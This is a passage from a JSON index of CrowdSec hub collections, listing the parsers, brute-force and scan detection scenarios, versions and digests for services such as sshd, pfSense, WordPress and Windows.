crowdsecurity/nginx-proxy-manager-logs\ncollections:\n  - crowdsecurity/base-http-scenarios\ndescription: \"Nginx Proxy Manager support : parser and generic http scenarios\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - nginx\n  - nginx-proxy\n  - crawl\n  - scan", "description": "Nginx Proxy Manager support : parser and generic http scenarios", "parsers": ["crowdsecurity/nginx-proxy-manager-logs"], "path": "collections/crowdsecurity/nginx-proxy-manager.yaml", "version": "0.1", "versions": {"0.1": {"digest": "fcde72227c4fc913f5472fff55e041aef913a0a4a0143f0ad8ef29bdc2e4e7f9"}}}, "crowdsecurity/odoo": {"content": "parsers:\n  - crowdsecurity/odoo-logs\nscenarios:\n  - crowdsecurity/odoo-bf_user-enum\ndescription: \"Odoo support : parser and brute-force/user enumeration detection\"\nauthor: crowdsecurity\ntags:\n  - erp\n  - odoo\n  - bruteforce\n", "description": "Odoo support : parser and brute-force/user enumeration detection", "parsers": ["crowdsecurity/odoo-logs"], "path": "collections/crowdsecurity/odoo.yaml", "scenarios": ["crowdsecurity/odoo-bf_user-enum"], "version": "0.1", "versions": {"0.1": {"digest": "7b9b2323ffda7ffd8a48aea52b8424bc12a58d0047bb9bebb2cf030c5fa088c9"}}}, "crowdsecurity/openbsd": {"collections": ["crowdsecurity/sshd", "crowdsecurity/whitelist-good-actors"], "content": "parsers:\n  - crowdsecurity/syslog-logs\n  - crowdsecurity/geoip-enrich\n  - crowdsecurity/dateparse-enrich\ncollections:\n  - crowdsecurity/sshd\n  - crowdsecurity/whitelist-good-actors\ndescription: \"core openbsd support : syslog+geoip+ssh\"\nauthor: crowdsecurity\ntags:\n  - openbsd\n", "description": "core openbsd support : syslog+geoip+ssh", "parsers": ["crowdsecurity/syslog-logs", "crowdsecurity/geoip-enrich", "crowdsecurity/dateparse-enrich"], "path": "collections/crowdsecurity/openbsd.yaml", "version": "0.2", "versions": {"0.1": {"digest": "6edc75ce23e1fa8723018f982a0ee927a200262a35d8d09191e554c619493d9d"}, "0.2": {"digest": "f3cfd144d2ee7dd75154847e3c38e82ab39de07ae7aba6fd6a87f63429b82ac1"}}}, "crowdsecurity/opnsense": {"collections": ["crowdsecurity/freebsd", "crowdsecurity/opnsense-gui", "firewallservices/pf"], "content": "collections:\n  - crowdsecurity/freebsd\n  - crowdsecurity/opnsense-gui\n  - firewallservices/pf\ndescription: \"core opnsense support\"\nauthor: crowdsecurity\ntags:\n  - freebsd\n", "description": "core opnsense support", "path": "collections/crowdsecurity/opnsense.yaml", "version": "0.4", "versions": {"0.1": {"digest": "2e389ca4cda774d45d19657579cee7bd735b62147875f333b8cd072ed4b91a04"}, "0.2": {"digest": "bfac0c94acc89565c80ed1be59b655d8ba718b0b0097bf9da378ee4f24a4d02d"}, "0.3": {"digest": "754157043e75342b8d6f4e0ae195657027473055072f7d22720d557a2f2e1c0d"}, "0.4": {"digest": "6cef916d409c4c75d69b22b5c65d2dc9ff83246cdb03e0650895ae7f213c04ab"}}}, "crowdsecurity/opnsense-gui": {"content": "parsers:\n  - crowdsecurity/opnsense-gui-logs\nscenarios:\n  - crowdsecurity/opnsense-gui-bf\ndescription: \"OPNSense web authentication support\"\nauthor: crowdsecurity\ntags:\n  - freebsd\n  - opnsense\n  - bruteforce\n  - scan\n\n\n", "description": "OPNSense web authentication support", "parsers": ["crowdsecurity/opnsense-gui-logs"], "path": "collections/crowdsecurity/opnsense-gui.yaml", "scenarios": ["crowdsecurity/opnsense-gui-bf"], "version": "0.1", "versions": {"0.1": {"digest": "91be3b0655e3de8a1c82787dadf1521c1ad1489e5798b5b9e2cdf3df0fc7cd1d"}}}, "crowdsecurity/palo-alto": {"content": "parsers:\n  - crowdsecurity/palo-alto-threat-log\nscenarios:\n  - crowdsecurity/palo-alto-threat\ncontexts:\n  - crowdsecurity/palo_alto\ndescription: \"Palo Alto support : Parser and scenarios for Palo Alto Threat Log\"\nauthor: crowdsecurity\ntags:\n  - palo-alto\n", "contexts": ["crowdsecurity/palo_alto"], "description": "Palo Alto support : Parser and scenarios for Palo Alto Threat Log", "parsers": ["crowdsecurity/palo-alto-threat-log"], "path": "collections/crowdsecurity/palo-alto.yaml", "scenarios": ["crowdsecurity/palo-alto-threat"], "version": "0.2", "versions": {"0.1": {"digest": "2976ac04400d43a55cbe7a7e6c62ba784c5e7b55bcf14c566d25e7218a87f526"}, "0.2": {"digest": "7509ca9a7de912219978f71f7ae5d2018adfde1dd000182ddd4942a9c09eaf8a"}}}, "crowdsecurity/pfsense": {"collections": ["crowdsecurity/freebsd", "crowdsecurity/pfsense-gui", "crowdsecurity/nginx", "firewallservices/pf"], "content": "collections:\n  - crowdsecurity/freebsd\n  - crowdsecurity/pfsense-gui\n  - crowdsecurity/nginx\n  - firewallservices/pf\ndescription: \"core pfsense support\"\nauthor: crowdsecurity\ntags:\n  - freebsd\n", "description": "core pfsense support", "path": "collections/crowdsecurity/pfsense.yaml", "version": "0.2", "versions": {"0.1": {"digest": "b0e0d8b751b34cc9d63268169a51849182039aa17ea78093a80da9d302756b97"}, "0.2": {"digest": "cc77813340e5e49379dcae520d2da5b2d5b9451eca6cbe7f5a68b6f9ad302d75"}}}, "crowdsecurity/pfsense-gui": {"content": "parsers:\n  - crowdsecurity/pfsense-gui-logs\nscenarios:\n  - crowdsecurity/pfsense-gui-bf\ndescription: \"pfSense web authentication support\"\nauthor: crowdsecurity\ntags:\n  - freebsd\n  - pfsense\n  - bruteforce\n  - scan\n", "description": "pfSense web authentication support", "parsers": ["crowdsecurity/pfsense-gui-logs"], "path": "collections/crowdsecurity/pfsense-gui.yaml", "scenarios": ["crowdsecurity/pfsense-gui-bf"], "version": "0.1", "versions": {"0.1": {"digest": "5e3c9d329eb515265634bcb8684180c2df2d01431273b6d1a9123e972109f408"}}}, "crowdsecurity/pgsql": {"content": "parsers:\n  - crowdsecurity/pgsql-logs\nscenarios:\n  - crowdsecurity/pgsql-bf\ndescription: \"postgres support : logs and brute-force scenarios\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - pgsql\n  - postgres\n  - bruteforce\n", "description": "postgres support : logs and brute-force scenarios", "parsers": ["crowdsecurity/pgsql-logs"], "path": "collections/crowdsecurity/pgsql.yaml", "scenarios": ["crowdsecurity/pgsql-bf"], "version": "0.1", "versions": {"0.1": {"digest": "78408615dfdfa97075b37dc7533b3d682b57293053aae5522ee3cd7b5825be02"}}}, "crowdsecurity/plex": {"content": "parsers:\n  - crowdsecurity/plex-allowlist\ndescription: \"plex support: allowlist\"\nauthor: crowdsecurity\ntags:\n  - plex\n  - allowlist\n", "description": "plex support: allowlist", "parsers": ["crowdsecurity/plex-allowlist"], "path": "collections/crowdsecurity/plex.yaml", "version": "0.1", "versions": {"0.1": {"digest": "2361b10d19f3f5c4d84ca2c8a9fbbfc8522e1f28047b2e2b87bdfbab6d119de3"}}}, "crowdsecurity/postfix": {"content": "parsers:\n  - crowdsecurity/postfix-logs\n  - crowdsecurity/postscreen-logs\nscenarios:\n  - crowdsecurity/postfix-spam\n  - crowdsecurity/postfix-relay-denied\n  - crowdsecurity/postfix-helo-rejected\n  - crowdsecurity/postfix-non-smtp-command\ndescription: \"postfix support : parser and spammer detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - spam\n  - bruteforce\n", "description": "postfix support : parser and spammer detection", "parsers": ["crowdsecurity/postfix-logs", "crowdsecurity/postscreen-logs"], "path": "collections/crowdsecurity/postfix.yaml", "scenarios": ["crowdsecurity/postfix-spam", "crowdsecurity/postfix-relay-denied", "crowdsecurity/postfix-helo-rejected", "crowdsecurity/postfix-non-smtp-command"], "version": "0.4", "versions": {"0.1": {"digest": "81767bab91a7a071d8d32f3227f2391744eef5ba6a4cf916a96ec8183d050ae0"}, "0.2": {"digest": "b4cceea527807a9fe70f673ef34e0d7d4372267d665fbbe164f0d6a1a3531a2e"}, "0.3": {"digest": "850515aa2593b279ddf33b2018b1c437f2481f961df8cb06e1f18ac53d14e110"}, "0.4": {"digest": "b04afb125fe152bff5a1f4043a5e46d4cbdb1780493a097836555659d23b154a"}}}, "crowdsecurity/proftpd": {"content": "parsers:\n  - crowdsecurity/proftpd-logs\nscenarios:\n  - crowdsecurity/proftpd-bf\n  - crowdsecurity/proftpd-bf_user-enum\ndescription: \"proftpd support : parser and brute-force/user enumeration detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - proftpd\n  - bruteforce\n\n", "description": "proftpd support : parser and brute-force/user enumeration detection", "parsers": ["crowdsecurity/proftpd-logs"], "path": "collections/crowdsecurity/proftpd.yaml", "scenarios": ["crowdsecurity/proftpd-bf", "crowdsecurity/proftpd-bf_user-enum"], "version": "0.1", "versions": {"0.1": {"digest": "6f98f64784109c356578bf50c7b296c5936bddfd5a206f25d39f92f504ea04ad"}}}, "crowdsecurity/sabnzbd": {"content": "parsers:\n  - crowdsecurity/sabnzbd-logs\nscenarios:\n  - crowdsecurity/sabnzbd-bf\ndescription: \"sabnzbd support : parser and brute-force detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - sabnzbd\n  - bruteforce\n\n", "description": "sabnzbd support : parser and brute-force detection", "parsers": ["crowdsecurity/sabnzbd-logs"], "path": "collections/crowdsecurity/sabnzbd.yaml", "scenarios": ["crowdsecurity/sabnzbd-bf"], "version": "0.1", "versions": {"0.1": {"digest": "d41742ac520e96f3739afa9f7a4d71e0cb9fa2e30994abd5bfffe9213216dea4"}}}, "crowdsecurity/smb": {"content": "parsers:\n  - crowdsecurity/smb-logs\nscenarios:\n  - crowdsecurity/smb-bf\ndescription: \"smb support : parser and brute-force scenario\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - smb\n  - bruteforce\n\n", "description": "smb support : parser and brute-force scenario", "parsers": ["crowdsecurity/smb-logs"], "path": "collections/crowdsecurity/smb.yaml", "scenarios": ["crowdsecurity/smb-bf"], "version": "0.1", "versions": {"0.1": {"digest": "9b87e4588319834b833778cc10602d906194d96b3fd6f8fdd8d1db7adf1a4abe"}}}, "crowdsecurity/sshd": {"content": "parsers:\n  - crowdsecurity/sshd-logs\nscenarios:\n  - crowdsecurity/ssh-bf\n  - crowdsecurity/ssh-slow-bf\n  - crowdsecurity/ssh-cve-2024-6387\n  - crowdsecurity/ssh-refused-conn\n  - crowdsecurity/ssh-generic-test\ndescription: \"sshd support : parser and brute-force detection\"\ncontexts:\n  - crowdsecurity/bf_base\nauthor: crowdsecurity\ntags:\n  - linux\n  - ssh\n  - bruteforce\n\n", "contexts": ["crowdsecurity/bf_base"], "description": "sshd support : parser and brute-force detection", "parsers": ["crowdsecurity/sshd-logs"], "path": "collections/crowdsecurity/sshd.yaml", "scenarios": ["crowdsecurity/ssh-bf", "crowdsecurity/ssh-slow-bf", "crowdsecurity/ssh-cve-2024-6387", "crowdsecurity/ssh-refused-conn", "crowdsecurity/ssh-generic-test"], "version": "0.7", "versions": {"0.1": {"digest": "21159aeb87529efcf1a5033f720413d5321a6451bab679a999f7f01a7aa972b3"}, "0.2": {"digest": "72f6329808fafbb42da52cc6476a6e794d0a1ae5b3847e0060cf23593dd40352"}, "0.3": {"digest": "31d549124634df1d13e67f0903b10c1816690589f4d6add6fec0ed74d30499bb"}, "0.4": {"digest": "f160bdac7f159746128db1f8d425d56ead03f47dfc4f0b0abfe4a6d3bc0a617b"}, "0.5": {"digest": "745d8f2a0460b80546812e618cbb65c99614a159759eede8a46c6b0f9dabdc53"}, "0.6": {"digest": "863e09515a3fa87e0dbdb7cbf2ebb74d2f2ccf783daa5f4bfc9b919c8d7aa594"}, "0.7": {"digest": "5e51a79350617712c2076c3fcc0c97d16ee6848a20463ba2497c6a14e73091b0"}}}, "crowdsecurity/sshd-impossible-travel": {"content": "parsers:\n  - crowdsecurity/sshd-success-logs\nscenarios:\n  - crowdsecurity/impossible-travel\n  - crowdsecurity/impossible-travel-user\ndescription: \"sshd success: parser and impossible travel\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - ssh\n  - inside-threat\n", "description": "sshd success: parser and impossible travel", "parsers": ["crowdsecurity/sshd-success-logs"], "path": "collections/crowdsecurity/sshd-impossible-travel.yaml", "scenarios": ["crowdsecurity/impossible-travel", "crowdsecurity/impossible-travel-user"], "version": "0.1", "versions": {"0.1": {"digest": "7ed01cfd256c6e46819ed63812200c988280894a9497623fbd1591237f4c8da2"}}}, "crowdsecurity/stirling-pdf": {"content": "parsers:\n  - crowdsecurity/stirling-pdf-logs\nscenarios:\n  - crowdsecurity/stirling-pdf-bf\ndescription: \"Stirling-PDF: parser and brute-force detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - stirling-pdf\n  - bruteforce\n\n\n", "description": "Stirling-PDF: parser and brute-force detection", "parsers": ["crowdsecurity/stirling-pdf-logs"], "path": "collections/crowdsecurity/stirling-pdf.yaml", "scenarios": ["crowdsecurity/stirling-pdf-bf"], "version": "0.1", "versions": {"0.1": {"digest": "3a53e0770c6173c3849f66aa83ccb474ca6e4d099798d41751bf6c02bec898d1"}}}, "crowdsecurity/supabase-compose": {"collections": ["crowdsecurity/nginx"], "content": "collections:\n  - crowdsecurity/nginx\nparsers:\n  - crowdsecurity/supabase-docker-pgsql\nscenarios:\n  - crowdsecurity/pgsql-bf\n  - crowdsecurity/pgsql-user-enum\n\ndescription: \"supabase docker compose support\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - pgsql\n  - postgres\n  - bruteforce\n  - nginx\n  - supabase\n  - docker-compose\n  - docker\n", "description": "supabase docker compose support", "parsers": ["crowdsecurity/supabase-docker-pgsql"], "path": "collections/crowdsecurity/supabase-compose.yaml", "scenarios": ["crowdsecurity/pgsql-bf", "crowdsecurity/pgsql-user-enum"], "version": "0.2", "versions": {"0.1": {"digest": "c96259bfa2e7e0d2782b945de44840f55721d05f3324ada1866fcbb0cdaa6462"}, "0.2": {"digest": "5d79c29d476579ef89c2656b563ec30736200015707eeae5ff918872115ecd40"}}}, "crowdsecurity/suricata": {"content": "parsers:\n  - crowdsecurity/suricata-logs\nscenarios:\n  - crowdsecurity/suricata-alerts\ndescription: \"suricata support : parser and automatic remediation on high/major alerts\"\nauthor: crowdsecurity\ncontexts:\n  - crowdsecurity/suricata_base\ntags:\n  - linux\n  - suricata\n  - IDS\n\n", "contexts": ["crowdsecurity/suricata_base"], "description": "suricata support : parser and automatic remediation on high/major alerts", "parsers": ["crowdsecurity/suricata-logs"], "path": "collections/crowdsecurity/suricata.yaml", "scenarios": ["crowdsecurity/suricata-alerts"], "version": "0.2", "versions": {"0.1": {"digest": "6f5d4ed7c676be6082af86c8ff771a063808a5970cb56edb9c8161c9b8390466"}, "0.2": {"digest": "dd64cd667d97c13485e0ca5c1274b1c33e9c98a0df76024cc12c88d461db1209"}}}, "crowdsecurity/synology-dsm": {"content": "# Synology DSM parsers\nparsers:\n  - crowdsecurity/synology-dsm-logs\n# Synology DSM collections\n#collections:\n#  - \n# the list of postoverflows it contains\n# postoverflows:\n#   - crowdsecurity/seo-bots-whitelist\n# the list of scenarios it contains\nscenarios:\n  - crowdsecurity/synology-dsm-bf\ndescription: \"Synology DSM web authentication support\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - synology\n  - bruteforce\n  - scan\n", "description": "Synology DSM web authentication support", "parsers": ["crowdsecurity/synology-dsm-logs"], "path": "collections/crowdsecurity/synology-dsm.yaml", "scenarios": ["crowdsecurity/synology-dsm-bf"], "version": "0.2", "versions": {"0.1": {"digest": "cdd3722569d65100a93620001b867e7932407410b7de78b56f88c7a721f61ac6"}, "0.2": {"digest": "6a2b5e562f0b6a4b9f1c03a05c73985e5326b7fa6d910f74a698fe182a951004"}}}, "crowdsecurity/teamspeak3": {"content": "parsers:\n  - crowdsecurity/teamspeak3-logs\nscenarios:\n  - crowdsecurity/teamspeak3-bf\ndescription: \"teamspeak3 support : parser and brute-force detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - teamspeak3\n  - bruteforce\n", "description": "teamspeak3 support : parser and brute-force detection", "parsers": ["crowdsecurity/teamspeak3-logs"], "path": "collections/crowdsecurity/teamspeak3.yaml", "scenarios": ["crowdsecurity/teamspeak3-bf"], "version": "0.1", "versions": {"0.1": {"digest": "d5012c6747469f7c7d8dbf6f3f1e156593911d490b4cbe8f9cad237865858c7e"}}}, "crowdsecurity/teleport": {"content": "parsers:\n  - crowdsecurity/teleport-logs\nscenarios:\n  - crowdsecurity/teleport-bf\n  - crowdsecurity/impossible-travel\n  - crowdsecurity/impossible-travel-user\ndescription: \"Teleport support : parser and brute-force detection\"\nauthor: crowdsecurity\ntags:\n  - teleport\n  - bruteforce\n", "description": "Teleport support : parser and brute-force detection", "parsers": ["crowdsecurity/teleport-logs"], "path": "collections/crowdsecurity/teleport.yaml", "scenarios": ["crowdsecurity/teleport-bf", "crowdsecurity/impossible-travel", "crowdsecurity/impossible-travel-user"], "version": "0.1", "versions": {"0.1": {"digest": "797254847c87721261c3898e36e8dfbb4fad9b88983e3311ef402808eef70241"}}}, "crowdsecurity/thehive": {"content": "parsers:\n  - crowdsecurity/thehive-logs\nscenarios:\n  - crowdsecurity/thehive-bf\ndescription: \"Thehive support : parser and brute-force detection\"\nauthor: crowdsecurity\ntags:\n  - soc\n  - security\n  - thehive\n  - bruteforce\n", "description": "Thehive support : parser and brute-force detection", "parsers": ["crowdsecurity/thehive-logs"], "path": "collections/crowdsecurity/thehive.yaml", "scenarios": ["crowdsecurity/thehive-bf"], "version": "0.1", "versions": {"0.1": {"digest": "3d6910c9ee4fd1c7395018de8ecd98a9128c858eb8799e631b754055711b1c29"}}}, "crowdsecurity/traefik": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "# co-authored with gmelodie (https://github.com/gmelodie)\nparsers:\n  - crowdsecurity/traefik-logs\ncollections:\n  - crowdsecurity/base-http-scenarios\ndescription: \"traefik support: parser and generic http scenarios\"\nauthor: crowdsecurity\ntags:\n  - traefik\n  - http\n  - bruteforce\n\n", "description": "traefik support: parser and generic http scenarios", "parsers": ["crowdsecurity/traefik-logs"], "path": "collections/crowdsecurity/traefik.yaml", "version": "0.1", "versions": {"0.1": {"digest": "b7b9feedcd49009ce80e4ab12c2642e68054222a7e7bb8611f2f45d5d3600ef2"}}}, "crowdsecurity/unifi": {"collections": ["crowdsecurity/iptables"], "content": "parsers:\n  - crowdsecurity/unifi-logs\n  - crowdsecurity/dropbear-logs\nscenarios:\n  - crowdsecurity/ssh-bf\ncollections:\n  - crowdsecurity/iptables\ndescription: \"Unifi support: syslog parser + port scan + SSH BF detection\"\nauthor: crowdsecurity\ntags:\n  - unifi\n  - ssh\n  - bruteforce\n  - dropbear\n  - portscan\n", "description": "Unifi support: syslog parser + port scan + SSH BF detection", "parsers": ["crowdsecurity/unifi-logs", "crowdsecurity/dropbear-logs"], "path": "collections/crowdsecurity/unifi.yaml", "scenarios": ["crowdsecurity/ssh-bf"], "version": "0.1", "versions": {"0.1": {"digest": "55ad6aac392ac93a0d866522c1fd88ba30c7c4ad99e334a9c46b741f948f27e6"}}}, "crowdsecurity/upsun": {"collections": ["crowdsecurity/nginx"], "content": "collections:\n  - crowdsecurity/nginx\nparsers:\n  - crowdsecurity/base-upsun-httplog-logs\ndescription: \"Selection of collections and parser for common UpSun webapp deployments and CrowdSecxUpSun project templates.\"\nauthor: crowdsecurity\ntags:\n  - upsun\n  - nginx\n  - linux", "description": "Selection of collections and parser for common UpSun webapp deployments and CrowdSecxUpSun project templates.", "parsers": ["crowdsecurity/base-upsun-httplog-logs"], "path": "collections/crowdsecurity/upsun.yaml", "version": "0.1", "versions": {"0.1": {"digest": "bdedc8a40d73e566f13f1e54262fc255f31c93f235f95cc7c5a3f9d7097a27b0"}}}, "crowdsecurity/vsftpd": {"content": "parsers:\n  - crowdsecurity/vsftpd-logs\nscenarios:\n  - crowdsecurity/vsftpd-bf\ndescription: \"VSFTPD support : logs and brute-force scenarios\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - ftp\n  - bruteforce\n", "description": "VSFTPD support : logs and brute-force scenarios", "parsers": ["crowdsecurity/vsftpd-logs"], "path": "collections/crowdsecurity/vsftpd.yaml", "scenarios": ["crowdsecurity/vsftpd-bf"], "version": "0.1", "versions": {"0.1": {"digest": "7cb60c9ce9772d4dc7227cc415a55114b8f4e3c07e27c17a666e56e11cb04b32"}}}, "crowdsecurity/whitelist-good-actors": {"content": "parsers:\n  - crowdsecurity/public-dns-allowlist\npostoverflows:\n  - crowdsecurity/seo-bots-whitelist\n  - crowdsecurity/cdn-whitelist\n  - crowdsecurity/rdns\ndescription: \"Good actors whitelists\"\nauthor: crowdsecurity\ntags:\n  - whitelist\n  - bots\n  - partners\n  - dns\n", "description": "Good actors whitelists", "parsers": ["crowdsecurity/public-dns-allowlist"], "path": "collections/crowdsecurity/whitelist-good-actors.yaml", "postoverflows": ["crowdsecurity/seo-bots-whitelist", "crowdsecurity/cdn-whitelist", "crowdsecurity/rdns"], "version": "0.2", "versions": {"0.1": {"digest": "70f9b1723423de3918bfa3f33fa9c266da71c897b6173ff21e2fb73f9a24245e"}, "0.2": {"digest": "7386572917718c75f5d0de3d4048be2384a495670b41d7bb44d223d98c6feb67"}}}, "crowdsecurity/whm": {"collections": ["crowdsecurity/apache2", "crowdsecurity/cpanel", "crowdsecurity/dovecot", "crowdsecurity/exim", "crowdsecurity/http-cve", "crowdsecurity/linux", "crowdsecurity/modsecurity", "crowdsecurity/mysql", "crowdsecurity/pgsql", "crowdsecurity/proftpd", "crowdsecurity/sshd", "crowdsecurity/vsftpd", "fulljackz/pureftpd", "crowdsecurity/whitelist-good-actors"], "content": "collections:\n  - crowdsecurity/apache2\n  - crowdsecurity/cpanel\n  - crowdsecurity/dovecot\n  - crowdsecurity/exim\n  - crowdsecurity/http-cve\n  - crowdsecurity/linux\n  - crowdsecurity/modsecurity\n  - crowdsecurity/mysql\n  - crowdsecurity/pgsql\n  - crowdsecurity/proftpd\n  - crowdsecurity/sshd\n  - crowdsecurity/vsftpd\n  - fulljackz/pureftpd\n  - crowdsecurity/whitelist-good-actors\ndescription: \"WHM broad selection of collections possibly being installed\"\nauthor: crowdsecurity\ntags:\n  - whm\n  - cpanel\n  - linux\n", "description": "WHM broad selection of collections possibly being installed", "path": "collections/crowdsecurity/whm.yaml", "version": "0.1", "versions": {"0.1": {"digest": "b2e05f1a3fb4a667f7bf39fa3224e3f77cc12a199f4fae209a9da173700fe768"}}}, "crowdsecurity/windows": {"collections": ["crowdsecurity/whitelist-good-actors"], "content": "parsers:\n  - crowdsecurity/windows-logs\n  - crowdsecurity/windows-auth\n  - crowdsecurity/geoip-enrich\n  - crowdsecurity/dateparse-enrich\nscenarios:\n  - crowdsecurity/windows-bf\ncollections:\n  - crowdsecurity/whitelist-good-actors\ndescription: \"core windows support : windows event log + bf detection\"\nauthor: crowdsecurity\ntags:\n  - windows\n", "description": "core windows support : windows event log + bf detection", "parsers": ["crowdsecurity/windows-logs", "crowdsecurity/windows-auth", "crowdsecurity/geoip-enrich", "crowdsecurity/dateparse-enrich"], "path": "collections/crowdsecurity/windows.yaml", "scenarios": ["crowdsecurity/windows-bf"], "version": "0.2", "versions": {"0.1": {"digest": "dca4187a260a723cfc7d47246cccfadab4249adca84f9e8b0cff7727f4503ae9"}, "0.2": {"digest": "94cd73d39d8c0a61e3300bfaac3034f57480678fc383b09541f1ae97d4d1853e"}}}, "crowdsecurity/windows-cve": {"content": "parsers:\n  - crowdsecurity/windows-logs\n  - crowdsecurity/sysmon-logs\nscenarios:\n  - crowdsecurity/windows-CVE-2022-30190-msdt\n  - crowdsecurity/CVE-2023-23397\ndescription: \"windows CVE: try to detect local CVE exploitation on windows.\"\nauthor: crowdsecurity\ntags:\n  - windows\n  - local\n  - exploit\n\n", "description": "windows CVE: try to detect local CVE exploitation on windows.", "parsers": ["crowdsecurity/windows-logs", "crowdsecurity/sysmon-logs"], "path": "collections/crowdsecurity/windows-cve.yaml", "scenarios": ["crowdsecurity/windows-CVE-2022-30190-msdt", "crowdsecurity/CVE-2023-23397"], "version": "0.3", "versions": {"0.1": {"digest": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}, "0.2": {"digest": "64a28a68af069438de9f54c6f31ffebf289d9bfe246bc42c06ef4228f65fa808"}, "0.3": {"digest": "ef9545e3263afd26967b0dbed02330f1841b7f33161c6c7e72e016785b052cac"}}}, "crowdsecurity/windows-firewall": {"content": "parsers:\n  - crowdsecurity/windows-firewall-logs\nscenarios:\n  - crowdsecurity/iptables-scan-multi_ports\ncontexts:\n  - crowdsecurity/firewall_base\ndescription: \"windows firewall support : logs and port-scans detection scenarios\"\nauthor: crowdsecurity\ntags:\n  - windows\n  - portscan\n\n", "contexts": ["crowdsecurity/firewall_base"], "description": "windows firewall support : logs and port-scans detection scenarios", "parsers": ["crowdsecurity/windows-firewall-logs"], "path": "collections/crowdsecurity/windows-firewall.yaml", "scenarios": ["crowdsecurity/iptables-scan-multi_ports"], "version": "0.2", "versions": {"0.1": {"digest": "597b15292d86f2aa7df95cc09fb9dc2f7d29aa541727f9704faa1095068889b2"}, "0.2": {"digest": "d5bc6aef85dc2fb3e9589c3d4ee2f879a66b1551787d05f70ad11a2146d98373"}}}, "crowdsecurity/wireguard": {"content": "parsers:\n  - crowdsecurity/wireguard-logs\n  - crowdsecurity/syslog-logs\nscenarios:\n  - crowdsecurity/wireguard-auth\ndescription: \"wireguard auth detection\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - wireguard\n  - vpn\n", "description": "wireguard auth detection", "parsers": ["crowdsecurity/wireguard-logs", "crowdsecurity/syslog-logs"], "path": "collections/crowdsecurity/wireguard.yaml", "scenarios": ["crowdsecurity/wireguard-auth"], "version": "0.1", "versions": {"0.1": {"digest": "0fa6e103d2206ee8037012e4c580323fde5bca957e4b8a70eb39e045c01a7d50"}}}, "crowdsecurity/wordpress": {"content": "scenarios:\n  - crowdsecurity/http-bf-wordpress_bf\n  - crowdsecurity/http-wordpress_wpconfig\n  - crowdsecurity/http-wordpress_user-enum\n  - crowdsecurity/http-wordpress-scan\ndescription: \"wordpress: Bruteforce protection and config probing\"\nauthor: crowdsecurity\ntags:\n  - linux\n  - wordpress\n  - bruteforce\n", "description": "wordpress: Bruteforce protection and config probing", "path": "collections/crowdsecurity/wordpress.yaml", "scenarios": ["crowdsecurity/http-bf-wordpress_bf", "crowdsecurity/http-wordpress_wpconfig", "crowdsecurity/http-wordpress_user-enum", "crowdsecurity/http-wordpress-scan"], "version": "0.5", "versions": {"0.1": {"digest": "14f428b1d171a092d703478a891db27aaf83a3f6ba99199a3be4a64d193d718d"}, "0.2": {"digest": "502dde075615e4b98edc705b43d3c3d52de6c0d4e62340b91ab5e8676c916668"}, "0.3": {"digest": "c342ae222954a731b60b7c72548fe876de791b3722088ae57cee09d2b2fd7028"}, "0.4": {"digest": "f45c1bb9daec2f8a81e125f75033a3a0198f4eb36c342985f831c77a3057f1bd"}, "0.5": {"digest": "7d253f3f00afe40eabe8334d1e2be59739ab87f3dddc9f9653948b2073a6b92b"}}}, "darkclip/charon-ipsec": {"content": "parsers:\n  - crowdsecurity/syslog-logs\n  - darkclip/charon-ipsec-logs\nscenarios:\n  - darkclip/charon-ipsec-bf\n  - darkclip/charon-ipsec-slow-bf\ndescription: \"Charon IPSEC support: parsers and scenarios\"\nauthor: darkclip\ntags:\n  - freebsd\n  - opnsense\n  - pfsense\n  - charon\n  - strongswan\n  - vpn\n  - ipsec\n  - bruteforce", "description": "Charon IPSEC support: parsers and scenarios", "parsers": ["crowdsecurity/syslog-logs", "darkclip/charon-ipsec-logs"], "path": "collections/darkclip/charon-ipsec.yaml", "scenarios": ["darkclip/charon-ipsec-bf", "darkclip/charon-ipsec-slow-bf"], "version": "0.1", "versions": {"0.1": {"digest": "936e0b860d53b0f5ec796488d4d70a6d0b97b4c480c297afcc0ee0326fa44edd"}}}, "firewallservices/lemonldap-ng": {"content": "scenarios:\n  - firewallservices/lemonldap-ng-bf\nparsers:\n  - firewallservices/lemonldap-ng\ndescription: \"Lemonldap::NG support : parser and brutefurce detection\"\nauthor: firewallservices\ntags:\n  - linux\n  - bruteforce\n", "description": "Lemonldap::NG support : parser and brutefurce detection", "parsers": ["firewallservices/lemonldap-ng"], "path": "collections/firewallservices/lemonldap-ng.yaml", "scenarios": ["firewallservices/lemonldap-ng-bf"], "version": "0.1", "versions": {"0.1": {"digest": "c7ee2139e599aa59a56e0db3b1946470426b0c766978d6dbc2cc8a76e8e22e4b"}}}, "firewallservices/pf": {"content": "scenarios:\n  - firewallservices/pf-scan-multi_ports\nparsers:\n  - firewallservices/pf-logs\ncontexts:\n  - crowdsecurity/firewall_base\ndescription: \"Parser and scenario for Packet Filter logs\"\nauthor: firewallservices\ntags:\n  - firewall\n  - pfsense\n  - freebsd\n  - portscan\n", "contexts": ["crowdsecurity/firewall_base"], "description": "Parser and scenario for Packet Filter logs", "parsers": ["firewallservices/pf-logs"], "path": "collections/firewallservices/pf.yaml", "scenarios": ["firewallservices/pf-scan-multi_ports"], "version": "0.2", "versions": {"0.1": {"digest": "d549e7f67cffe712b081a9467a84f94f9a57a3852a369e68d079b61eba83c264"}, "0.2": {"digest": "955cbafa111bfceef4d61ff0b345d459fc806d8e3d110a1e429ce2575468034c"}}}, "firewallservices/zimbra": {"content": "parsers:\n  - firewallservices/zimbra-logs\nscenarios:\n  - firewallservices/zimbra-bf\ndescription: \"zimbra support : parser and spammer detection\"\nauthor: firewallservices\ntags:\n  - linux\n  - spam\n  - bruteforce\n  - zimbra\n", "description": "zimbra support : parser and spammer detection", "parsers": ["firewallservices/zimbra-logs"], "path": "collections/firewallservices/zimbra.yaml", "scenarios": ["firewallservices/zimbra-bf"], "version": 